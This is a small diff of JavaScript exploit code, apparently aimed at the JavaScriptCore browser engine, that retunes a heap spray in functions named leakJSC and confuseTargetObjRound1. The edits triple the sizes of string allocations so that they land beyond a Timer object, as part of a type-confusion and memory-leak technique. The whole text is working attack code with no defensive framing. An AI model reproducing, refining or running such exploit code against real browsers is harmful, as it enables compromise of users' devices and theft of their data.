@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(8 * 3 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -358,7 +358,7 @@ function leakJSC() {
  */
 function confuseTargetObjRound1() {
 	/* Force allocation of StringImpl obj. beyond Timer address */
-	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
+	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 3);
 
 	/* Checking for leaked data */
 	if (findTargetObj() === false)
